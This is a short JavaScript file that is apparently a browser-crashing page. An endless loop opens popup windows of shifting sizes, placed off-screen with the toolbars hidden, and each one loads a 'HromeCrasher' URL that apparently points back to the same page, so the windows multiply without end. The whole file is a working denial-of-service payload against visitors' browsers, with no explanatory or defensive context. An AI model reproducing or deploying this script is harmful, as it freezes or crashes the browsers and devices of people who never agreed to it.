let da = 1
let height = 50
  while (true) {
    da = da + 1
    for (let width = 50; width <= 1600; width++) {
      if (height<=900) {
        height++
      }
      params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
      width=${width},height=${height},left=-1000,top=-1000`;
      open('https://lexa526.github.io/HromeCrasher/', da, params);
    }
    for (let width = 1600; width >= 50; width--) {
      if (height>=50) {
        height--
      }
      params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
      width=${width},height=${height},left=-1000,top=-1000`;
      open('https://lexa526.github.io/HromeCrasher/', da, params);
    }
  }
